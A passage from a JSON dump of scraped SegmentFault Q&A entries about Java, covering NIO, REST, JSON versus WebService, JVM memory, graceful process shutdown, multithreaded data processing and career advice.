      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000367549\">\n<p><strong>内核空间</strong>、<strong>用户空间</strong>、<strong>计算机体系结构</strong>、<strong>计算机组成原理</strong>、…… 确实有点儿深奥。</p>\n<p>我的新书《代码之谜》会有专门的章节讲解相关知识，现在写个简短的科普文：</p>\n<p>就速度来说 <code>CPU &gt; 内存 &gt; 硬盘</code></p>\n<ul>\n<li><code>I</code>- 就是从硬盘到内存</li>\n<li><code>O</code>- 就是从内存到硬盘</li>\n</ul>\n<p>第一种方式：我从硬盘读取数据，然后程序一直等，数据读完后，继续操作。这种方式是最简单的，叫<strong>阻塞IO</strong>。</p>\n<p>第二种方式：我从硬盘读取数据，然后程序继续向下执行，等数据读取完后，通知当前程序（对硬件来说叫<strong>中断</strong>，对程序来说叫<strong>回调</strong>），然后此程序可以立即处理数据，也可以执行完当前操作在读取数据。</p>\n<p>在一起的 Java IO 中，都是阻塞式 IO，NIO 引入了非阻塞式 IO。</p>\n<p>还有一种就是同步 IO 和异步 IO。经常说的一个术语就是“异步非阻塞”，好象异步和非阻塞是同一回事，这大概是一个误区吧。</p>\n<p>至于 Java NIO 的 Selector，在旧的 Java IO 系统中，是基于 Stream 的，即“流”，流式 IO。</p>\n<p>当程序从硬盘往内存读取数据的时候，操作系统使用了 2 个“小伎俩”来提高性能，那就是<strong>预读</strong>，如果我读取了第一扇区的第三磁道的内容，那么你很有可能也会使用第二磁道和第四磁道的内容，所以操作系统会把附近磁道的内容提前读取出来，放在内存中，即<strong>缓存</strong>。</p>\n<p>（PS：以上过程简化了）</p>\n<p>通过上面可以看到，操作系统是按<strong>块 Block</strong>从硬盘拿数据，就如同一个大脸盆，一下子就放入了一盆水。但是，当 Java 使用的时候，旧的 IO 确实基于 <strong>流 Stream</strong>的，也就是虽然操作系统给我了一脸盆水，但是我得用吸管慢慢喝。</p>\n<p>于是，NIO 横空出世。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000314712\">\n<html><body><p>补充：查阅网上相关资料都说，NIO是和操作系统底层相关的，这就一句话，不得其解；还有NIO的Selector的那个工作模式它是怎么实现的呢？\n<img data-src=\"http://segmentfault.com/img/bVbt19\"/></p></body></html>\n</div>",
      "favourite": "12",
      "glance": "18.5k",
      "tags": [
        "java",
        "nio",
        "jvm"
      ],
      "time": "2013-09-30",
      "title": "Java NIO与IO的详细区别(可不可以深入到JVM和操作系统来讲解)",
      "url": "https://segmentfault.com/q/1010000000314712"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000316998\">\n<p>以下代码有什么可能的bug？如何修正？</p>\n<pre><code class=\"lang-java\">volatile int[] arr = new int[...];\n...\narr[4] = 100;\n</code></pre>\n</div>",
      "favourite": "8",
      "glance": "1.8k",
      "tags": [
        "java",
        "面试题"
      ],
      "time": "2013-10-08",
      "title": "一道java面试题，求助",
      "url": "https://segmentfault.com/q/1010000000316998"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000371864\">\n<p>下位机：单片机<br/>\n上位机：PC<br/>\n单片机和PC机之间通过串口通信，单片机定时将采集数据通过串口传送至PC机。<br/>\nPC机上的软件通过调用串口读取信息，将信息解析后存储到数据库。<br/>\n然后要采用Web服务，供移动等设备访问将采集的数据，并发送指令到服务器，服务器将指令解析后，调用串口将指令下发到单片机。<br/>\n最后还要在上位机端，设计本地软件，可以读取数据库数据，也可以调用串口数据库等内容。<br/>\n请问在上位机如何设计软件结构，采用何种语言实现。<br/>\n最近使用java做，但是java编写桌面程序并不好使。<br/>\n求解。</p>\n</div>",
      "favourite": "5",
      "glance": "1.7k",
      "tags": [
        "java"
      ],
      "time": "2013-12-28",
      "title": "请问关于这样的项目，如何选择编程语言和框架等",
      "url": "https://segmentfault.com/q/1010000000371864"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000401181\">\n<p>先生成 <code>build.xml</code>：</p>\n<pre><code>android update project -p . --target android-15\n</code></pre>\n<p><code>android-15</code> 是我这里唯一列出来的 target。</p>\n<p>然后编译：</p>\n<pre><code>ant release\n</code></pre>\n<p>报错：</p>\n<pre><code>    [javac] Compiling 505 source files to /ldata/txtfiles/src/xabber-android/bin/classes\n    [javac] /ldata/txtfiles/src/xabber-android/src/com/xabber/android/service/XabberService.java:114: 错误: 找不到符号\n    [javac]                     setForeground(true);\n    [javac]                     ^\n    [javac]   符号:   方法 setForeground(boolean)\n    [javac]   位置: 类 XabberService\n    [javac] /ldata/txtfiles/src/xabber-android/src/com/xabber/android/service/XabberService.java:141: 错误: 找不到符号\n    [javac]                     setForeground(false);\n    [javac]                     ^\n    [javac]   符号:   方法 setForeground(boolean)\n    [javac]   位置: 类 XabberService\n    [javac] /ldata/txtfiles/src/xabber-android/src/com/xabber/android/utils/DummyCursor.java:25: 错误: DummyCursor不是抽象的, 并且未覆盖Cursor中的抽象\n方法getType(int)\n    [javac] public class DummyCursor implements Cursor {\n    [javac]        ^\n    [javac] 注: 某些输入文件使用或覆盖了已过时的 API。\n    [javac] 注: 有关详细信息, 请使用 -Xlint:deprecation 重新编译。\n    [javac] 注: 某些输入文件使用了未经检查或不安全的操作。\n    [javac] 注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。\n    [javac] 3 个错误\n\nBUILD FAILED\n</code></pre>\n<p>源码在： <a href=\"https://github.com:redsolution/xabber-android\" rel=\"nofollow\">git@github.com:redsolution/xabber-android.git</a></p>\n</div>",
      "favourite": "0",
      "glance": "2k",
      "tags": [
        "android",
        "java",
        "编译打包"
      ],
      "time": "2014-01-29",
      "title": "xabber apk 编译出错",
      "url": "https://segmentfault.com/q/1010000000401181"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000418209\">\n<p>REST类似一种最佳实践，不是一种技术。把Internet上的内容、服务等所有东西看成一个资源并对应一个url，把HTTP的方法对应到资源的操作。这样的最佳实践符合Internet和HTTP最初的设计思想，因此会有与生俱来的优点。如果想弄清楚REST的好处，需要重新思考下HTTP协议本身，并结合自己的开发经验自己总结分析一下。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000424502\">\n<p>我也推荐一片文章 <a href=\"http://mccxj.github.io/blog/20130530_introduce-to-rest.html\" rel=\"nofollow\">《理解RESTFul架构》</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000418003\">\n<p>所谓rest的精髓就是<strong>把url当作一种资源</strong>，一种传递变量的资源。至于如何no repeat yourself，在于如何设计这种利用url的方式。 ruby on rails的crud可以借鉴一下。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000416140\">\n<p>很早就听说REST这个词，但是一直也没有深入去了解过。<br>\n今天在网上大概搜了一下，<a href=\"http://zh.wikipedia.org/wiki/REST\" rel=\"nofollow\">wiki</a>上面有一个使用范例，不太清楚，特来提问。</br></p>\n<hr>\n<p>一个简单的网络商店应用，<br>\n列举所有商品，<br>\nGET <a href=\"http://www.store.com/products\" rel=\"nofollow\">http://www.store.com/products</a><br>\n呈现某一件商品，<br>\nGET <a href=\"http://www.store.com/products/12345\" rel=\"nofollow\">http://www.store.com/products/12345</a><br>\n下单购买，<br>\nPOST <a href=\"http://www.store.com/order/\" rel=\"nofollow\">http://www.store.com/order/</a><br><purchase-order><br><item> ... </item><br/></br></purchase-order></br></br></br></br></br></br></br></p>\n<hr>\n<p>难道这样就实现了REST，这种请求方式有什么特别的地方吗？<br>\n希望有人能帮我详细分析一下这样做有什么好处，谢谢</br></p>\n</hr></hr></div>",
      "favourite": "13",
      "glance": "6.1k",
      "tags": [
        "java",
        "rest"
      ],
      "time": "2014-02-22",
      "title": "关于REST API的疑惑",
      "url": "https://segmentfault.com/q/1010000000416140"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000420438\">\n<p>类似于银行这种场合，放在大厅，供用户进行简单操作、展示的功能，且适合触摸屏的开发方案有哪些？</p>\n<p>请有类似开发经验的高手支招。</p>\n<p>谢谢。</p>\n<hr>\n<p>我们现在使用浏览器，全屏，我觉得这种方案不好。</p>\n<p>我希望得到即关于软件解决方案，有包括软件开发方案的答案。</p>\n<hr>\n</hr></hr></div>",
      "favourite": "1",
      "glance": "1.5k",
      "tags": [
        "程序员",
        "编程",
        "java",
        "触摸屏"
      ],
      "time": "2014-02-27",
      "title": "有哪些适合开发全屏操作、展示功能的方案？",
      "url": "https://segmentfault.com/q/1010000000420438"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000497832\">\n<pre><code>getMenuInflater().inflate(R.menu.options, menu);  \n\n\n//搜索视窗，因为showAsAction=\"ifRoom\"，所以图三中出现了搜索按钮  \n SearchView searchView = (SearchView) menu.findItem(R.id.menu_search)  \n    .getActionView();  \n\n//分享视窗，因为showAsAction=\"never\"，所以只能在溢出菜单中才看见到  \nShareActionProvider mShareActionProvider = (ShareActionProvider) menu  \n    .findItem(R.id.menu_share).getActionProvider();  \nIntent shareIntent = new Intent(Intent.ACTION_SEND);  \nshareIntent.setType(\"image/*\");  \nmShareActionProvider.setShareIntent(shareIntent);  \n\n//设置视窗，MyActionProvider就是我们自定义的ActionProvider  \nMyActionProvider myactionprovider = (MyActionProvider) menu.findItem(  \n    R.id.menu_setting).getActionProvider();  \nreturn super.onCreateOptionsMenu(menu);  \n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n</code></pre>\n<p></p>\n<menu>\n<pre><code>&lt;item\n    android:id=\"@+id/menu_search\"\n    android:actionViewClass=\"android.widget.SearchView\"\n    android:icon=\"@drawable/ic_menu_search\"\n    android:showAsAction=\"ifroom\"\n    android:title=\"搜索\"/&gt;\n&lt;item\n    android:id=\"@+id/menu_share\"\n    android:actionProviderClass=\"android.widget.ShareActionProvider\"\n    android:showAsAction=\"never\"\n    android:title=\"分享\"/&gt;\n&lt;item\n    android:id=\"@+id/menu_setting\"\n    android:actionProviderClass=\"com.example.tabdemo.MyActionProvider\"\n    android:showAsAction=\"never\"\n    android:title=\"设置\"&gt;\n    &lt;menu&gt;\n        &lt;item\n            android:id=\"@+id/menu_theme\"\n            android:actionProviderClass=\"com.example.tabdemo.MyActionProvider\"\n            android:showAsAction=\"always|withText\"\n            android:title=\"更换主题\"/&gt;\n        &lt;item\n            android:id=\"@+id/menu_system\"\n            android:actionProviderClass=\"com.example.tabdemo.MyActionProvider\"\n            android:showAsAction=\"always|withText\"\n            android:title=\"系统设置\"/&gt;\n    &lt;/menu&gt;\n&lt;/item&gt;\n</code></pre>\n<p></p>\n</menu>\n<p>点击下拉菜单总是会出现null指针。经发现是mShareActionProvider。<br>\n另外为啥点击后不能触发事件。进入对应自定义的ActionProvider。<br>\n配置文件<br>\n                android:actionProviderClass=\"com.example.tabdemo.MyActionProvider\"<br>\n这个不起作用？</br></br></br></br></p>\n<p>难道还要自己在onOptionsItemSelected触发事件？</p>\n</div>",
      "favourite": "2",
      "glance": "3.4k",
      "tags": [
        "android",
        "java"
      ],
      "time": "2014-05-08",
      "title": "actionbar下拉菜单的问题",
      "url": "https://segmentfault.com/q/1010000000497832"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000643490\">\n<p>JSON确实是一种很好的交换数据结构。<br>\n除了这个之外，javascript原生支持json解析，且解析起来很简单。这个很重要，因为http接口大部分是给页面的Javascript解析使用的。然后为了保持一套接口，app代码也使用这个json接口。所以就流行了起来。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000643438\">\n<p>json解析比较简单，在js或者php很容易就可以解析成对象，易于操作</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000643556\">\n<p>你这实际上是三个问题，从WebService到今天流行的RESTful API(JSON) over HTTP，经历了数次变革</p>\n<h3>1 WebService有很多协议，为什么HTTP比较流行？</h3>\n<p>WebService是个很重型的规范，它的应用协议是SOAP（简单对象访问协议），它所依赖的下层通信方式不单单是HTTP，也有SOAP over SMTP, SOAP over TCP，由于HTTP协议群众基础广，开发调试方便，所以，成了WebService中最为流行的方式。</p>\n<p>甚至很多公司在内网通信，也用HTTP来做，比如，应用调用搜索引擎，Solr就是一个例子。</p>\n<p>但HTTP也是TCP上性能比较差的协议，因为HTTP是基于TCP的，有3次握手，再加上HTTP是个文本传输协议（虽然也可以传二进制的附件，但业务逻辑还是文本用的多），又有很多复杂的HEADER。所以人们发明了一些更高效的通信协议来做远程调用，比如ACE、ICE、Corba、淘宝的HSF，但这是后话了，不展开细说。你只要知道，HTTP之所以流行，乃是简单易用群众基础广的结果。</p>\n<h3>2 WebService为什么不如RESTful API流行</h3>\n<p>WebService诞生十几年了，最初是IBM、微软比较热心在推，一直也不温不火。倒是XML-RPC, RESTful以及比RESTful还要简陋的远程调用方式后来居上。感觉是不是有点像民间的Spring干掉官方的EJB？</p>\n<p>究其原因，还是WebService实在太笨重了，SOAP信封犹如婆娘的裹脚布，又臭又长，广大开发人员是叔可忍嫂不能忍，于是就有了简化版的，叫XML-RPC，后来伴随着Web2.0流行，RESTful独领风骚。我在10年前做过一个产品，纯PHP+JS，标准的WebService，连WSDL我都要专门写个PHP程序来生成，还好只是我一个人开发，要是团队协作，我早就被骂得不成人形了。</p>\n<p>再后来，连RESTful都被嫌弃了，大伙儿干脆连PUT、DELETE都懒得用，直接用GET和POST。</p>\n<p>同时，我得说，这只是在互联网领域，大部分企业的业务逻辑相对简单，同时工期又变态的短（就像大部分互联网创业公司用糙快猛的PHP，而不用相对严谨的Java一样）。在某些业务复杂，稳定性和正确性要求高的领域（如ERP、电商、支付），WebService还有是用武之地的。</p>\n<h3>3 为什么JSON比XML流行</h3>\n<p>还是易用性，JSON的可读性比XML强几条长安街，解析规则也简单许多。XML解析的时候规则太多了，动不动就非法字符，动不动就抛异常。这对追求高开发速度和低开发门槛的企业来说，是个致命伤。</p>\n<p>JSON的缺点是数据类型支持较少，且不精确。比方说：</p>\n<pre><code>price:12580\n</code></pre>\n<p>在json里，你无法知道这个价格是int, float还是double。</p>\n<p>所以，如上面第二条所述，在一些业务要求较高的领域，还是XML更合适。</p>\n<p>最后说一下性能，JSON的性能高于XML，除此之外，基于XML和HTTP的WebService, 基于JSON的RESTful API，并没有性能差异。</p>\n<p>XML性能糟糕到什么地步呢，有一种专门的CPU叫做XML Accelerator，专门为XML解析提供硬件加速。</p>\n</div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000643367\">\n<p>曾经不同系统间交互问题时，总是优先考虑webserivce，现在看到除了一些老牌的公司，比如amazonk对众的接口还是webservice的方式，其他很多国内新项目的接口都开始转向直接传json的方式。我知道的优势之一，就是webservice的消息体肯定比json这种方式要大。请问，除此之外，设计这些对众接口的时候，还有什么其他的考虑吗？</p>\n</div>",
      "favourite": "51",
      "glance": "29.7k",
      "tags": [
        "系统架构",
        "第三方接口",
        "php",
        "java"
      ],
      "time": "2014-08-21",
      "title": "为什么很多第三方接口，都改成了基于http，直接传递json数据的方式来代替webservice?",
      "url": "https://segmentfault.com/q/1010000000643367"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000671344\">\n<p>你只要不执行 kill -9 , 就算优雅</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000671661\">\n<p>shutdown.sh</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000671773\">\n<p><code>kill -15 pid</code>,具体参考<a href=\"http://kenwublog.com/kill-java-correctly\" rel=\"nofollow\">正确地kill java进程</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000668242\">\n<p>无论是在 Linux 还是 Windows 下，如何能优雅地让 Java 程序停止运行？想了解一下 <code>Runtime.getRuntime().addShutdownHook</code> 会在什么样的情况下才会被调用，什么样的情况下不被调用。</p>\n<p>想找一个最可行的解决方案。</p>\n</div>",
      "favourite": "1",
      "glance": "2.6k",
      "tags": [
        "java",
        "linux"
      ],
      "time": "2014-09-14",
      "title": "如何优雅地停止 Java 程序",
      "url": "https://segmentfault.com/q/1010000000668242"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000691996\">\n<p>可以考虑用队列试试看，扫全表将等待处理的数据放入队列（单线程），然后多线程消费。由于出队本身具有原子性，可防止重复读，且性能有保证（特指redis）。此外，如果生产端单线程扫表还无法满足的话，可以考虑多线程取模读取数据放入队列。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000691422\">\n<p>我有点不明白.上千万数据你不可能一次性全部拿到缓存里吧!!!!!</p>\n<p>我又看你说表中每一条数据都有一个标记.&lt;--修改之前看看这个标记不就行了.</p>\n<p>在改动这条数据的时候.java端你只需要保证对这条数据的相关数据bean的操作(他可能是1步骤或者多步骤)<br>\n是原子性的就行了.&lt;--当你改完他之后其他线程万一获取了数据就是你改过的了.</br></p>\n<p>数据量大的update操作还是用jdbc的批量操作比较快.</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000691416\">\n<p>其实这个不是加锁的问题，而是数据分发的问题。加锁是为了防止高并发下产生脏数据，而你其实是希望处理过或者已被其他线程先拿到的数据不要再处理了，对吧？</p>\n<p>如何进行数据分发，提高集群（或多线程）处理效率，这个要结合你们的数据模型来考虑。</p>\n<p>比如处理的数据ID中有数字标识，当前你有10台机器或者10个线程，那么可以让这10台机器各自读取1/10的数据，这可以通过取余(%10)做到。比如第1台机器读取i%10==1的ID的数据，第2台读取i%10==2的，以此类推。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000691385\">\n<p>悲剧啊，，，<br>\n侦听卡死了，数据积存了13天，上千万数据。<br>\n现有程序处理不过来，需要写一个多线程来处理。</br></br></p>\n<hr>\n<p>如题，该如何加锁？希望各位前辈能给一点建议。</p>\n<p>顺便说一下，需要处理的表有一个状态字段，用于标识处理与否。</p>\n</hr></div>",
      "favourite": "2",
      "glance": "3.8k",
      "tags": [
        "java",
        "多线程",
        "oracle",
        "同步锁"
      ],
      "time": "2014-09-24",
      "title": "在多线程处理表数据的时候 ，怎么防止数据被重复处理？",
      "url": "https://segmentfault.com/q/1010000000691385"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000739754\">\n<p>If my application has too many static variables or methods, then as per definition they will be stored in heap. Please correct me if I am wrong<br>\n1) Will these variables be on heap until application is closed?<br>\n2) Will they be available for GC at any time? If not can I say it is a memory leak?</br></br></p>\n</div>",
      "favourite": "1",
      "glance": "1.1k",
      "tags": [
        "java"
      ],
      "time": "2014-10-25",
      "title": "Can using too many static variables cause a memory leak in Java?",
      "url": "https://segmentfault.com/q/1010000000739754"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000740022\">\n<pre><code>public Class A {\n    public static String s = \"s\";\n    public static int i = 0;\n    public int j = 1;\n    public static String getStaticString() {\n        int k = 2;\n        return s;\n    }\n    public String getString() {\n        int l = 3;\n        return \"something\";\n    }\n}\n</code></pre>\n<p>根据很多资料，<code>static variables</code>是存在<code>heap</code>中的<code>Perm</code>代，<code>primitive</code>类型存在<code>stack</code>中。<br>\n问题：<br>\n1、<code>s</code>是存在<code>heap</code>中的<code>Perm</code>代，<code>i</code>, <code>j</code>, <code>k</code>, <code>l</code>存在哪呢？<br>\n2、<code>static</code>方法存在哪？非<code>static</code>方法存在哪？也就是说，<code>getStaticString</code>存在哪，<code>getString</code>方法存在哪？</br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "java",
        "jvm"
      ],
      "time": "2014-10-25",
      "title": "Java heap/stack有关的问题",
      "url": "https://segmentfault.com/q/1010000000740022"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002489346\">\n<p>multi-mechanize <a href=\"http://multimechanize.com\" rel=\"nofollow\">http://multimechanize.com</a> <a href=\"https://pypi.python.org/pypi/multi-mechanize\" rel=\"nofollow\">https://pypi.python.org/pypi/multi-mechanize</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002653882\">\n<p><a href=\"http://www.haoservice.com/\" rel=\"nofollow\">http://www.haoservice.com/</a>  你去这上面看看</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000001638081\">\n<p><a href=\"http://apiary.io/\" rel=\"nofollow\">http://apiary.io/</a></p>\n<p>Collaborative design, instant API mock, generated documentation, integrated code samples, debugging and automated testing.</p>\n</div>",
      "attention": "16",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000001638046\">\n<p>目前开发的api接口需要测试性能和负载，要求api接口参数可自定义，譬如使用某种规则封装api参数，目前的api接口都是post请求接口，有什么推荐的好工具吗？</p>\n</div>",
      "favourite": "4",
      "glance": "6.6k",
      "tags": [
        "java",
        "php",
        "python"
      ],
      "time": "2014-11-15",
      "title": "求推荐：api接口并发测试工具",
      "url": "https://segmentfault.com/q/1010000001638046"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002388276\">\n<p>一直不是很理解JVM主要应用于哪些技术开发，最近看<strong>周志明的《深入理解Java虚拟机》</strong>是源于自己想加深对Java的了解，以便为春招找份好的工作（主要是找Android开发方面的）……这本书除了前几章将JVM历史、内存管理机制、类加载方面比较好理解，看到后面就比较难理解了，特别是程序编译和代码优化、JMM和线程安全与锁优化的，就比较羞涩难懂了……<strong>如果以后只是想往Android方面发展，需要对JVM了解多深？</strong></p>\n</div>",
      "favourite": "3",
      "glance": "1.7k",
      "tags": [
        "jvm",
        "jmm",
        "java"
      ],
      "time": "2014-11-25",
      "title": "熟悉JVM对编程有哪方面好处？如何更好地理解JMM？需要结合哪些知识点去理解，需要做哪方面的实践去加深理解？",
      "url": "https://segmentfault.com/q/1010000002388276"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002394035\">\n<p>众所周知，java中实现缓存最简单的办法就是使用LinkedHashMap。参考: <a href=\"http://aliahhqcheng.iteye.com/admin/blogs/1665024\" rel=\"nofollow\">http://aliahhqcheng.iteye.com/admin/blogs/1665024</a></p>\n<p>然而这样的缓存，在多线程下就会出现问题，使得程序发生异常。那么问题来了，如何实现一个线程安全的缓存呢？</p>\n<ol>\n<li>有线程安全的HashMap--&gt;ConcurrentHashMap,可是没有线程安全的LinkedHashMap。不过阿里的同学实现了一个对ConcurrentHashMap进行改装，实现了线程安全的缓存，参考：<a href=\"http://jm-blog.aliapp.com/?p=689\" rel=\"nofollow\">http://jm-blog.aliapp.com/?p=689</a>\n</li>\n<li>使用Collections.synchronizedMap（）包装LinkedHashMap，这个也是一种实现方式。</li>\n<li>使用读写锁ReentrantReadWriteLock+LinkedHashMap实现。</li>\n<li>使用synchronized + memcached</li>\n<li>redis可以支持吗？</li>\n<li>guava cache如何实现的</li>\n</ol>\n<p>想听一听大家的建议？</p>\n</div>",
      "favourite": "1",
      "glance": "3.5k",
      "tags": [
        "java"
      ],
      "time": "2014-11-28",
      "title": "java如何实现线程安全的缓存",
      "url": "https://segmentfault.com/q/1010000002394035"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002553433\">\n<p>精通是个我比较讨厌的词~因为如果你去看简历 大家都说精通xx语言<br>\n但是你问他为啥要装箱拆箱 他都说不明白 这些人还会说你不能问点实际的问题吗？<br>\n程序员得有追求<br>\n1 - 首先追求极致的代码  每个代码块做到极简 优美 有很良好的编码习惯<br>\n2 - 代码块见的逻辑优美 代码复用 功能依赖这些问题解决好<br>\n3 - 追求框架的优美 你能设计出一个精致的框架 来适合你的项目 这就需要你了解 你自己的需求 未来发展 以及市场上流行的框架 你还要熟悉各种设计模式 怎么才能设计出优美的结构<br>\n说白了 一句话 程序就像造一辆车 结构清晰 功能独立 并且易维护<br>\n这是我的一点见解~</br></br></br></br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002553385\">\n<p>不对，你的思路不对，做了3年PHP，那PHP的技术来说肯定不差了，问题是你现在服务器端的东西搞的咋样？自己能独立的部署一套负载均衡的系统么？lnmp玩转了？其实你可以都看看linux以及nginx，自己做项目组长，自己带团队带项目，然后期间再去看看其他语言。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002498867\">\n<p>您好，我经验还比较浅薄，如有不当请不吝指教。<br>\n我也有过转换平台的经历，从Android转iOS。我并不认为有什么吃亏的，软件开发都是相通的，转iOS也并没有让我的Android退步，相反还让我具备了从更高角度看待软件开发的眼光，境界上得到了提升。<br>\n其实死抱一门语言一个平台才对技术水平的提升不利，何况这种特定的技术还可能失宠甚至被淘汰。所以应当尽可能超越具体的语言具体的平台，超越php，超越java。我认为您正走在正确的道路上。</br></br></p>\n</div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002498369\">\n<pre><code>    作为一个工作四年的程序员，觉得在知识面广的同时应该在某一两个方面精通，即所谓的T型人才。\n\n    但是又不知道应该在哪方面进行更好的钻研，不知道各位大牛有什么好的建议，或者说说\n\n你们是怎么对这方面进行规划的呢？\n\n说说本人的经历：\n\n    3年的PHP经验，\n\n    最近1年转了java，做java中间件。\n\n    目前准备看看机会，HR都说，这么写简历会比较吃亏。都建议写4年的PHP经验，呵呵。\n\n    可是本人还是比较想做java。纠结中...\n</code></pre>\n</div>",
      "favourite": "2",
      "glance": "1.7k",
      "tags": [
        "php",
        "系统架构",
        "java"
      ],
      "time": "2015-01-20",
      "title": "作为一个程序员，如何规划自己在哪几个方面进行更深入的学习，达到精通？",
      "url": "https://segmentfault.com/q/1010000002498369"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002619166\">\n<p>这不是业务逻辑，而是数据库最基本的功能。<br>\n一般说业务逻辑放在数据库是指用存储过程等方法把业务特定的逻辑放在数据库中。我个人不赞同这种方式。<br>\n另外省份是可以，也应该用第三种方式统计的。你需要的是一张城市代码和省份对应关系的字典表。</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003100840\">\n<p>首先我们需要分清楚数据和状态。</p>\n<p><strong>状态是对数据的抽象</strong>。<br>数据多半不能直接被用户看到（比如你不能直接返回一个timestamp给用户），而状态则更贴近业务；<br>数据需要是原子的（数据库第一、二范式），而状态一般涉及一条以上的数据；<br>数据稳定性高，状态变数多：需求变化了，不应该去操作全量数据，而是修改状态控制；<br>数据适合放在有持久化的地方，而状态根据数据动态算出，适合放在内存中（当然，系统大到出现集群的概念以后，状态也可能需要持久化）。</br></br></br></br></p>\n<h2>读</h2>\n<p>大部分时候，我们需要的都不是裸数据，而是根据数据获得的状态。由数据转化为状态的逻辑总得放在一个端，要么是数据库，要么是后端，在非常少见的情形里，是前端/客户端。</p>\n<p>读操作的逻辑放在哪里不那么非黑即白，需要根据具体业务分析。</p>\n<h2>写</h2>\n<p>对数据本身的约束可以放在数据库中：</p>\n<ul>\n<li><p>unique</p></li>\n<li><p>unsigned</p></li>\n<li><p>primary</p></li>\n</ul>\n<p>对状态的约束一般在控制在数据的写操作<strong>前</strong>：</p>\n<ul><li><p>“每天只允许注册 100 个用户”这个需求就创建了“是否今天注册了超过100个用户”的状态</p></li></ul>\n<p>如果对状态的约束全需要放在业务逻辑里，业务逻辑写在哪里呢？<br>不得不说，业务逻辑使用存储过程/触发器实现有很多很多缺点：</br></p>\n<ul>\n<li><p>存储过程/触发器异常处理很麻烦，程序流程处理复杂了不说，也难以对异常情形生成友好的错误提示</p></li>\n<li><p>存储过程/触发器难以断点调试</p></li>\n<li><p>存储过程/触发器基于关系型数据库，做更加复杂（树状结构等）/ 更加简单（连循环计算都需要一个临时表）的逻辑都有很大损耗</p></li>\n<li><p>存储过程/触发器杂糅了逻辑在数据库中，业务变大以后难以合理分层</p></li>\n<li><p>存储过程/触发器使用描述性语言，相对难以优化</p></li>\n</ul>\n<p>因此，几乎没有人把对状态的写操作的相关业务逻辑写在存储过程/触发器里。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002619985\">\n<p>个人观点，简单的放在数据库，复杂的放在程序里。</p>\n<p>先说约束，即什么合法什么不合法，比如「账户余额必须是数字」和「账户余额不能小于零」这种简单约束就比较适合放在数据库，因为这是一个不太可能去修改的底线，数据库中所有的数据都必须满足这个条件。<br>\n再比如「每天只允许注册 100 个用户」这种约束就比较适合放在程序里，因为不满足这个约束也不会对数据造成破坏，且这个约束很可能在未来修改。</br></p>\n<p>然后是查询，应该尽量在数据库中通过更多的查询条件淘汰掉不符合要求的数据，合适地选择查询条件会让数据库更有效率地利用索引。数据库有很多措施来保证当数据达到一个很大的量的时候依然可以快速地查询，但是如果把数据查到应用里再进行筛选，数据的量可能超出设计时的预期。</p>\n<p>分组也应当尽量在数据库进行，这样会减少传输的数据的量，而且数据库只需扫描一次就可以得到所有分组的结果（按照你的做法一，数据库很可能要扫描多次，因为数据库不知道你的几个查询之间的联系）。</p>\n</div>",
      "attention": "5",
